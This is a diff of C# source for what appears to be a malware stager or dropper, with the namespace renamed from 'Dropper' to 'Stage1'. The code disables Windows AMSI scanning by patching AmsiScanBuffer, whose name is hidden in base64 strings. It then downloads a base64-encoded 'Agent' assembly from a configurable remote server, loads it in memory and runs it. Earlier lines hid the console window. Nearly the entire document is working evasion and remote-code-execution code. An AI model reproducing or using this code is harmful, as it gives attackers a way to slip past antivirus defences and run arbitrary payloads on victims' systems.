@@ -1,37 +1,72 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
-using System.Net.Http;
-using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.IO;
+using System.Net.Http;
+using System.Runtime.InteropServices;
 
-namespace Dropper
+namespace Stage1
 {
-    class Program
+    public static class Stage
     {
-        static void Main(string[] args)
+        public static void Entry(string agentparams)
         {
-            //IntPtr whdl = GetConsoleWindow();
-            //_ = ShowWindow(whdl, 0);
+#if DEBUG
+            Console.WriteLine(agentparams);
+#endif
+            var tab = agentparams.Split(':');
+            string protocol = tab[0];
+            string server = tab[1];
+            int port = int.Parse(tab[2]);
 
-            string protocol = Config.Potocol.Trim();
-            string server = Config.Address.Trim();
-            int port = int.Parse(Config.Port.Trim());
-            string agentparams = $"{protocol}:{server}:{port}";
+
+
+#if DEBUG
+            Console.WriteLine("Creating request");
+#endif
 
             HttpClient client = new HttpClient();
             client.Timeout = new TimeSpan(0, 0, 10);
             client.BaseAddress = new Uri($"{protocol}://{server}:{port}");
             client.DefaultRequestHeaders.Clear();
 
-#if PATCHAMSI
-            PatchAMSI();
-#endif
 
-            var b64 = client.GetStringAsync($"Agent.b64").Result;
+
+#if DEBUG
+            Console.WriteLine("Before Patching");
+#endif
+            try
+            {
+                PatchAMSI();
+
+#if DEBUG
+                Console.WriteLine("Patched");
+#endif
+            }
+            catch (Exception ex)
+            {
+#if DEBUG
+                Console.WriteLine("Cannot Patch AMSI");
+#endif
+            }
+
+#if DEBUG
+            if (Is64Bit)
+                Console.WriteLine("x64");
+            else
+                Console.WriteLine("x86");
+#endif
+            string file = "Agent";
+            if (!Is64Bit)
+                file += "-x86";
+            file += ".b64";
+
+#if DEBUG
+            Console.WriteLine(file);
+#endif
+            var b64 = client.GetStringAsync(file).Result;
 
             var asm = Convert.FromBase64String(b64);
 
@@ -45,7 +80,7 @@ namespace Dropper
                 sw.AutoFlush = true;
 
 
-                var assembly = Assembly.Load(asm);
+                var assembly = System.Reflection.Assembly.Load(asm);
                 assembly.EntryPoint.Invoke(null, new object[] { new string[] { agentparams } });
 
                 Console.Out.Flush();
@@ -57,9 +92,7 @@ namespace Dropper
                 var output = Encoding.UTF8.GetString(ms.ToArray());
             }
         }
-        
 
-#if PATCHAMSI
         static string dec(string enc)
         {
             byte[] b = Convert.FromBase64String(enc);
@@ -68,7 +101,7 @@ namespace Dropper
 
         static void PatchAMSI()
         {
-            
+
             var lib = LoadLibrary(dec("YW1zaS5kbGw="));
             var asb = GetProcAddress(lib, dec("QW1zaVNjYW5CdWZmZXI="));
             var patch = GetPatch;
@@ -113,12 +146,5 @@ namespace Dropper
             UIntPtr dwSize,
             uint flNewProtect,
             out uint lpflOldProtect);
-#endif
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow(); 
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
